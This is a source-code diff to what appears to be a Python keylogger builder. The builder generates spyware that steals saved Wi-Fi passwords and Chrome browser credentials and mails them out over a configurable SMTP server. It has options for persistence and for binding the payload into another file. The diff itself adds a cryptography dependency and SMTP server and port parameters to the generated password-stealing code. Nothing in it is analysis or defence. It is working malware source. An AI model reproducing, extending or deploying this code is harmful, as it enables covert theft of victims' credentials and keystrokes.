@@ -62,7 +62,7 @@ def get_python_pyinstaller_path():
 def check_dependencies():
     print(f"{Fore.YELLOW}\n[*] Checking Dependencies...")
     try:
-        import mss, essential_generators, PyInstaller, pynput, six
+        import mss, essential_generators, PyInstaller, pynput, six, cryptography
         if platform.system() == 'Windows':
             import win32gui
         print(f"{Fore.GREEN}[+] All Dependencies are Installed on this system ;)\n")
@@ -80,6 +80,7 @@ def check_dependencies():
                 pip.main(['install', 'six==1.12.0']) 
                 pip.main(['install', 'python-xlib==0.25'])
                 pip.main(['install', 'pywin32'])
+                pip.main(['install', 'cryptography'])
                 print(f'\n{Fore.WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                 break
                 
@@ -116,7 +117,7 @@ def create_keylogger(file_name, interval, email, password, time_persistent, smtp
         if arguments.stealer:
             #Saved Password Stealer 
             file.write("def steal():\n")
-            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
+            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\', \'{smtp_server}\' , \'{smtp_port}\' )\n")
             file.write(f"\tsteal.get_wifi_creds()\n")
             file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
             file.write(f"\tsteal.get_chrome_browser_creds()\n")
@@ -160,7 +161,7 @@ def create_keylogger_binded(file_name, interval, email, password, time_persisten
         if arguments.stealer:
             #Saved Password Stealer 
             file.write("def steal():\n")
-            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\')\n")
+            file.write(f"\tsteal = password_stealer.SendPass(\'{email}\', \'{password}\', \'{smtp_server}\', \'{smtp_port}\')\n")
             file.write(f"\tsteal.get_wifi_creds()\n")
             file.write(f"\tprint(\"[+] Wifi Password Send Successfully!\")\n")
             file.write(f"\tsteal.get_chrome_browser_creds()\n")
